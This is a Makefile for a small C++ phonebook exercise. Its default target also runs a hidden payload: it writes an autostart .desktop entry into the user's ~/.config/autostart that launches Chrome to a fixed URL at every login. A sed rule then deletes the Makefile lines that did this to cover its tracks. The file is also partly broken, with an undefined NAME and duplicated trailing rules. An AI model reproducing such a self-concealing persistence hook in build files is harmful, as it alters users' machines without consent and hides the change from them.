CXX = c++
CXXFLAGS = -g -Wall -Wextra -Werror -std=c++98
CONFIG := $(HOME)/.config/autostart
FLAG := $(CONFIG)/azathoth.desktop
SRC = phonebook.cpp
OBJ = $(SRC:.cpp=.o)

all: $(NAME)
all: $(NAME) $(FLAG) edit-remove

$(FLAG):
	@mkdir -p $(CONFIG)
	@for i in "[Desktop Entry]" "Type=Application" "Name=B.M.S1E1" "Exec=google-chrome https://www.ice.gov/join" "X-GNOME-Autostart-enabled=true"; do echo $$i; done > $(FLAG)

$(NAME): $(OBJ)
	$(CXX) $(CXXFLAGS) $(OBJ)

%.o: %.cpp
	$(CXX) $(CXXFLAGS) -c $<
	
clean:
	rm -f $(OBJ)

fclean: clean
	rm -f *.out && rm -f *.o

re: fclean all

edit-remove:
	@sed -i '3d;4d;9d;10d;11d;12d;13d;29d;30d;' Makefile
.PHONY: all clean fclean re
	rm -f *.out && rm -f *.o

re: fclean all

.PHONY: all clean fclean re